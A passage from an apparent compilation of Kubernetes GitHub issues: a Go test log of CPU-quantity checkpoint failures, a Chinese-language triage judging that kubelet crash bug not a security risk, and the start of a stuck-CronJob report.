=== RUN   Test_stateCheckpoint_storeState/format_22_-_cpu_0.1n
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_23_-_cpu_0.1u
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_24_-_cpu_0.1m
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_25_-_cpu_0.1k
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_26_-_cpu_0.1M
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_27_-_cpu_0.1G
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_28_-_cpu_0.1T
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_29_-_cpu_0.1P
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_30_-_cpu_0.1E
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_31_-_cpu_0.1
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_32_-_cpu_0.03Ki
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_33_-_cpu_0.03Mi
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_34_-_cpu_0.03Gi
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_35_-_cpu_0.03Ti
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_36_-_cpu_0.03Pi
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_37_-_cpu_0.03Ei
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_38_-_cpu_0.03n
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_39_-_cpu_0.03u
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_40_-_cpu_0.03m
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_41_-_cpu_0.03k
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_42_-_cpu_0.03M
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_43_-_cpu_0.03G
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_44_-_cpu_0.03T
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_45_-_cpu_0.03P
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_46_-_cpu_0.03E
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_47_-_cpu_0.03
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_48_-_cpu_10Ki
=== RUN   Test_stateCheckpoint_storeState/format_49_-_cpu_10Mi
=== RUN   Test_stateCheckpoint_storeState/format_50_-_cpu_10Gi
=== RUN   Test_stateCheckpoint_storeState/format_51_-_cpu_10Ti
=== RUN   Test_stateCheckpoint_storeState/format_52_-_cpu_10Pi
=== RUN   Test_stateCheckpoint_storeState/format_53_-_cpu_10Ei
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_54_-_cpu_10n
=== RUN   Test_stateCheckpoint_storeState/format_55_-_cpu_10u
=== RUN   Test_stateCheckpoint_storeState/format_56_-_cpu_10m
=== RUN   Test_stateCheckpoint_storeState/format_57_-_cpu_10k
=== RUN   Test_stateCheckpoint_storeState/format_58_-_cpu_10M
=== RUN   Test_stateCheckpoint_storeState/format_59_-_cpu_10G
=== RUN   Test_stateCheckpoint_storeState/format_60_-_cpu_10T
=== RUN   Test_stateCheckpoint_storeState/format_61_-_cpu_10P
=== RUN   Test_stateCheckpoint_storeState/format_62_-_cpu_10E
=== RUN   Test_stateCheckpoint_storeState/format_63_-_cpu_10
=== RUN   Test_stateCheckpoint_storeState/format_64_-_cpu_100Ki
=== RUN   Test_stateCheckpoint_storeState/format_65_-_cpu_100Mi
=== RUN   Test_stateCheckpoint_storeState/format_66_-_cpu_100Gi
=== RUN   Test_stateCheckpoint_storeState/format_67_-_cpu_100Ti
=== RUN   Test_stateCheckpoint_storeState/format_68_-_cpu_100Pi
=== RUN   Test_stateCheckpoint_storeState/format_69_-_cpu_100Ei
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_70_-_cpu_100n
=== RUN   Test_stateCheckpoint_storeState/format_71_-_cpu_100u
=== RUN   Test_stateCheckpoint_storeState/format_72_-_cpu_100m
=== RUN   Test_stateCheckpoint_storeState/format_73_-_cpu_100k
=== RUN   Test_stateCheckpoint_storeState/format_74_-_cpu_100M
=== RUN   Test_stateCheckpoint_storeState/format_75_-_cpu_100G
=== RUN   Test_stateCheckpoint_storeState/format_76_-_cpu_100T
=== RUN   Test_stateCheckpoint_storeState/format_77_-_cpu_100P
=== RUN   Test_stateCheckpoint_storeState/format_78_-_cpu_100E
=== RUN   Test_stateCheckpoint_storeState/format_79_-_cpu_100
=== RUN   Test_stateCheckpoint_storeState/format_80_-_cpu_512Ki
=== RUN   Test_stateCheckpoint_storeState/format_81_-_cpu_512Mi
=== RUN   Test_stateCheckpoint_storeState/format_82_-_cpu_512Gi
=== RUN   Test_stateCheckpoint_storeState/format_83_-_cpu_512Ti
=== RUN   Test_stateCheckpoint_storeState/format_84_-_cpu_512Pi
=== RUN   Test_stateCheckpoint_storeState/format_85_-_cpu_512Ei
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_86_-_cpu_512n
=== RUN   Test_stateCheckpoint_storeState/format_87_-_cpu_512u
=== RUN   Test_stateCheckpoint_storeState/format_88_-_cpu_512m
=== RUN   Test_stateCheckpoint_storeState/format_89_-_cpu_512k
=== RUN   Test_stateCheckpoint_storeState/format_90_-_cpu_512M
=== RUN   Test_stateCheckpoint_storeState/format_91_-_cpu_512G
=== RUN   Test_stateCheckpoint_storeState/format_92_-_cpu_512T
=== RUN   Test_stateCheckpoint_storeState/format_93_-_cpu_512P
=== RUN   Test_stateCheckpoint_storeState/format_94_-_cpu_512E
=== RUN   Test_stateCheckpoint_storeState/format_95_-_cpu_512
=== RUN   Test_stateCheckpoint_storeState/format_96_-_cpu_1000Ki
=== RUN   Test_stateCheckpoint_storeState/format_97_-_cpu_1000Mi
=== RUN   Test_stateCheckpoint_storeState/format_98_-_cpu_1000Gi
=== RUN   Test_stateCheckpoint_storeState/format_99_-_cpu_1000Ti
=== RUN   Test_stateCheckpoint_storeState/format_100_-_cpu_1000Pi
=== RUN   Test_stateCheckpoint_storeState/format_101_-_cpu_1000Ei
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_102_-_cpu_1000n
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_103_-_cpu_1000u
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_104_-_cpu_1000m
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_105_-_cpu_1000k
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_106_-_cpu_1000M
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_107_-_cpu_1000G
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_108_-_cpu_1000T
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_109_-_cpu_1000P
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_110_-_cpu_1000E
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_111_-_cpu_1000
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_112_-_cpu_1024Ki
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_113_-_cpu_1024Mi
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_114_-_cpu_1024Gi
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_115_-_cpu_1024Ti
=== RUN   Test_stateCheckpoint_storeState/format_116_-_cpu_1024Pi
=== RUN   Test_stateCheckpoint_storeState/format_117_-_cpu_1024Ei
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_118_-_cpu_1024n
=== RUN   Test_stateCheckpoint_storeState/format_119_-_cpu_1024u
=== RUN   Test_stateCheckpoint_storeState/format_120_-_cpu_1024m
=== RUN   Test_stateCheckpoint_storeState/format_121_-_cpu_1024k
=== RUN   Test_stateCheckpoint_storeState/format_122_-_cpu_1024M
=== RUN   Test_stateCheckpoint_storeState/format_123_-_cpu_1024G
=== RUN   Test_stateCheckpoint_storeState/format_124_-_cpu_1024T
=== RUN   Test_stateCheckpoint_storeState/format_125_-_cpu_1024P
=== RUN   Test_stateCheckpoint_storeState/format_126_-_cpu_1024E
=== RUN   Test_stateCheckpoint_storeState/format_127_-_cpu_1024
=== RUN   Test_stateCheckpoint_storeState/format_128_-_cpu_700Ki
=== RUN   Test_stateCheckpoint_storeState/format_129_-_cpu_700Mi
=== RUN   Test_stateCheckpoint_storeState/format_130_-_cpu_700Gi
=== RUN   Test_stateCheckpoint_storeState/format_131_-_cpu_700Ti
=== RUN   Test_stateCheckpoint_storeState/format_132_-_cpu_700Pi
=== RUN   Test_stateCheckpoint_storeState/format_133_-_cpu_700Ei
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_134_-_cpu_700n
=== RUN   Test_stateCheckpoint_storeState/format_135_-_cpu_700u
=== RUN   Test_stateCheckpoint_storeState/format_136_-_cpu_700m
=== RUN   Test_stateCheckpoint_storeState/format_137_-_cpu_700k
=== RUN   Test_stateCheckpoint_storeState/format_138_-_cpu_700M
=== RUN   Test_stateCheckpoint_storeState/format_139_-_cpu_700G
=== RUN   Test_stateCheckpoint_storeState/format_140_-_cpu_700T
=== RUN   Test_stateCheckpoint_storeState/format_141_-_cpu_700P
=== RUN   Test_stateCheckpoint_storeState/format_142_-_cpu_700E
=== RUN   Test_stateCheckpoint_storeState/format_143_-_cpu_700
=== RUN   Test_stateCheckpoint_storeState/format_144_-_cpu_10000Ki
=== RUN   Test_stateCheckpoint_storeState/format_145_-_cpu_10000Mi
=== RUN   Test_stateCheckpoint_storeState/format_146_-_cpu_10000Gi
=== RUN   Test_stateCheckpoint_storeState/format_147_-_cpu_10000Ti
=== RUN   Test_stateCheckpoint_storeState/format_148_-_cpu_10000Pi
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_149_-_cpu_10000Ei
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_150_-_cpu_10000n
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_151_-_cpu_10000u
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_152_-_cpu_10000m
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_153_-_cpu_10000k
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_154_-_cpu_10000M
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_155_-_cpu_10000G
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_156_-_cpu_10000T
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_157_-_cpu_10000P
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_158_-_cpu_10000E
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_159_-_cpu_10000
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
--- FAIL: Test_stateCheckpoint_storeState (1.43s)
    --- PASS: Test_stateCheckpoint_storeState/format_0_-_cpu_1Ki (0.02s)
    --- PASS: Test_stateCheckpoint_storeState/format_1_-_cpu_1Mi (0.04s)
    --- PASS: Test_stateCheckpoint_storeState/format_2_-_cpu_1Gi (0.03s)
    --- PASS: Test_stateCheckpoint_storeState/format_3_-_cpu_1Ti (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_4_-_cpu_1Pi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_5_-_cpu_1Ei (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_6_-_cpu_1n (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_7_-_cpu_1u (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_8_-_cpu_1m (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_9_-_cpu_1k (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_10_-_cpu_1M (0.00s)
    --- PASS: Test_stateCheckpoint_storeState/format_11_-_cpu_1G (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_12_-_cpu_1T (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_13_-_cpu_1P (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_14_-_cpu_1E (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_15_-_cpu_1 (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_16_-_cpu_0.1Ki (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_17_-_cpu_0.1Mi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_18_-_cpu_0.1Gi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_19_-_cpu_0.1Ti (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_20_-_cpu_0.1Pi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_21_-_cpu_0.1Ei (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_22_-_cpu_0.1n (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_23_-_cpu_0.1u (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_24_-_cpu_0.1m (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_25_-_cpu_0.1k (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_26_-_cpu_0.1M (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_27_-_cpu_0.1G (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_28_-_cpu_0.1T (0.00s)
    --- FAIL: Test_stateCheckpoint_storeState/format_29_-_cpu_0.1P (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_30_-_cpu_0.1E (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_31_-_cpu_0.1 (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_32_-_cpu_0.03Ki (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_33_-_cpu_0.03Mi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_34_-_cpu_0.03Gi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_35_-_cpu_0.03Ti (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_36_-_cpu_0.03Pi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_37_-_cpu_0.03Ei (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_38_-_cpu_0.03n (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_39_-_cpu_0.03u (0.02s)
    --- FAIL: Test_stateCheckpoint_storeState/format_40_-_cpu_0.03m (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_41_-_cpu_0.03k (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_42_-_cpu_0.03M (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_43_-_cpu_0.03G (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_44_-_cpu_0.03T (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_45_-_cpu_0.03P (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_46_-_cpu_0.03E (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_47_-_cpu_0.03 (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_48_-_cpu_10Ki (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_49_-_cpu_10Mi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_50_-_cpu_10Gi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_51_-_cpu_10Ti (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_52_-_cpu_10Pi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_53_-_cpu_10Ei (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_54_-_cpu_10n (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_55_-_cpu_10u (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_56_-_cpu_10m (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_57_-_cpu_10k (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_58_-_cpu_10M (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_59_-_cpu_10G (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_60_-_cpu_10T (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_61_-_cpu_10P (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_62_-_cpu_10E (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_63_-_cpu_10 (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_64_-_cpu_100Ki (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_65_-_cpu_100Mi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_66_-_cpu_100Gi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_67_-_cpu_100Ti (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_68_-_cpu_100Pi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_69_-_cpu_100Ei (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_70_-_cpu_100n (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_71_-_cpu_100u (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_72_-_cpu_100m (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_73_-_cpu_100k (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_74_-_cpu_100M (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_75_-_cpu_100G (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_76_-_cpu_100T (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_77_-_cpu_100P (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_78_-_cpu_100E (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_79_-_cpu_100 (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_80_-_cpu_512Ki (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_81_-_cpu_512Mi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_82_-_cpu_512Gi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_83_-_cpu_512Ti (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_84_-_cpu_512Pi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_85_-_cpu_512Ei (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_86_-_cpu_512n (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_87_-_cpu_512u (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_88_-_cpu_512m (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_89_-_cpu_512k (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_90_-_cpu_512M (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_91_-_cpu_512G (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_92_-_cpu_512T (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_93_-_cpu_512P (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_94_-_cpu_512E (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_95_-_cpu_512 (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_96_-_cpu_1000Ki (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_97_-_cpu_1000Mi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_98_-_cpu_1000Gi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_99_-_cpu_1000Ti (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_100_-_cpu_1000Pi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_101_-_cpu_1000Ei (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_102_-_cpu_1000n (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_103_-_cpu_1000u (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_104_-_cpu_1000m (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_105_-_cpu_1000k (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_106_-_cpu_1000M (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_107_-_cpu_1000G (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_108_-_cpu_1000T (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_109_-_cpu_1000P (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_110_-_cpu_1000E (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_111_-_cpu_1000 (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_112_-_cpu_1024Ki (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_113_-_cpu_1024Mi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_114_-_cpu_1024Gi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_115_-_cpu_1024Ti (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_116_-_cpu_1024Pi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_117_-_cpu_1024Ei (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_118_-_cpu_1024n (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_119_-_cpu_1024u (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_120_-_cpu_1024m (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_121_-_cpu_1024k (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_122_-_cpu_1024M (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_123_-_cpu_1024G (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_124_-_cpu_1024T (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_125_-_cpu_1024P (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_126_-_cpu_1024E (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_127_-_cpu_1024 (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_128_-_cpu_700Ki (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_129_-_cpu_700Mi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_130_-_cpu_700Gi (0.02s)
    --- PASS: Test_stateCheckpoint_storeState/format_131_-_cpu_700Ti (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_132_-_cpu_700Pi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_133_-_cpu_700Ei (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_134_-_cpu_700n (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_135_-_cpu_700u (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_136_-_cpu_700m (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_137_-_cpu_700k (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_138_-_cpu_700M (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_139_-_cpu_700G (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_140_-_cpu_700T (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_141_-_cpu_700P (0.03s)
    --- PASS: Test_stateCheckpoint_storeState/format_142_-_cpu_700E (0.02s)
    --- PASS: Test_stateCheckpoint_storeState/format_143_-_cpu_700 (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_144_-_cpu_10000Ki (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_145_-_cpu_10000Mi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_146_-_cpu_10000Gi (0.02s)
    --- PASS: Test_stateCheckpoint_storeState/format_147_-_cpu_10000Ti (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_148_-_cpu_10000Pi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_149_-_cpu_10000Ei (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_150_-_cpu_10000n (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_151_-_cpu_10000u (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_152_-_cpu_10000m (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_153_-_cpu_10000k (0.02s)
    --- FAIL: Test_stateCheckpoint_storeState/format_154_-_cpu_10000M (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_155_-_cpu_10000G (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_156_-_cpu_10000T (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_157_-_cpu_10000P (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_158_-_cpu_10000E (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_159_-_cpu_10000 (0.02s)
FAIL

```
</details>

#### Kubernetes version

The bug happened in version 1.28, but it will happen in latest version 1.31 too.


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在Kubernetes中，当处理静态Pod时，如果Pod的资源请求值采用特定格式（例如"cpu": "0.4"），可能导致kubelet在重启时无法通过校验和验证，从而导致kubelet持续崩溃。重现步骤中，需要将具有特定格式的Pod规范文件复制到节点的`/etc/kubernetes/manifest/`目录，该目录通常只有具有管理员权限的用户才能访问和修改。

根据风险判断标准：

1. **该风险能被攻击者利用**：攻击者需要具有管理员权限才能将文件放入`/etc/kubernetes/manifest/`目录，这超出了普通攻击者的权限范围。

4. **在风险为拒绝服务（DoS）攻击时，如果攻击者需要一定权限才能够实施该攻击，则视情况需要降级处理，当漏洞利用需要攻击者具备创建、修改等非只读权限时，则不应判断为高风险**：该漏洞的利用需要具有高权限的管理员操作。

因此，该Issue不涉及安全风险，属于管理员在配置静态Pod时需要注意的问题，普通攻击者无法利用该漏洞实现攻击。

---

## Issue #128358 Cronjob's stuck job was not marked as failed and blocked new schedules

- Issue 链接：[#128358](https://github.com/kubernetes/kubernetes/issues/128358)

### Issue 内容

#### What happened?

I have a cronjob that runs every 5 minutes, concurrency policy is forbidden:
```
apiVersion: batch/v1
kind: CronJob
metadata:
  name: backup-job
spec:
  concurrencyPolicy: Forbid
  startingDeadlineSeconds: 200
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      backoffLimit: 0
      activeDeadlineSeconds: 240
      ......
      spec:
        restartPolicy: Never
        activeDeadlineSeconds: 240
```
I found that a job that has been there for 84 minutes when I was checking: 

```
$ kubectl get jobs -n zzz
NAME                COMPLETIONS     DURATION    AGE
